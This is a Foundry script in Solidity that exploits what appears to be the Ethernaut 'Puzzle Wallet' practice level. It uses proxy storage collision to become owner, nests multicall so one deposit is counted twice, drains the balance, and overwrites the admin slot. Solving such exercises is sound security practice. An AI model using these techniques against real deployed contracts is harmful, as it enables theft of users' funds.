// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../levels/PuzzleWallet.sol";

contract PuzzleWalletAttack is Script {
    bytes[] arr = new bytes[](1);

    function run(address addr) external {
        vm.startBroadcast();

        PuzzleWallet pw = PuzzleWallet(addr);
        PuzzleProxy pr = PuzzleProxy(payable(addr));

        bytes[] memory depositDeep = new bytes[](1);
        depositDeep[0] = abi.encodeWithSelector(pw.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(pw.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(pw.multicall.selector, depositDeep);

        pr.proposeNewAdmin(msg.sender);
        pw.addToWhitelist(msg.sender);
        //this will call deposit 2 times with nesting
        pw.multicall{value: 0.001 ether}(nestedMulticall);
        pw.execute(msg.sender, 0.002 ether, "");
        pw.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
